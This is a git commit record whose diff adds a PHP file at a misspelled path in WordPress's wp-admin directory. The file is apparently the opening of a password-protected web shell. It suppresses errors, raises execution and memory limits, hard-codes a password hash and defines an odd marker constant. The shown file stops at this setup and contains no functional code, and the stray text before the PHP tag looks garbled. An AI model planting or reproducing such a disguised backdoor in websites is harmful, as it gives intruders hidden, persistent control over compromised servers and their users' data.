e056fd17436c4e6603242da9b6ed809baf07ff6e
Pedrootoniel <pedrootonielsantos@outlook.com>
2023-01-04 06:23:44 -0300

    first commit

---
+++ wp-admin/conentme/user/index.php
@@ -0,0 +1,10 @@
+postpass<?php
+error_reporting(E_ERROR);
+@ini_set('display_errors','Off');
+@ini_set('max_execution_time',20000);
+@ini_set('memory_limit','256M');
+header("content-Type: text/html; charset=utf-8");
+$password = "9cf9ffdce70e787dd580fccee52f402e";
+define('Viv, bebegim.','');
+
+?>
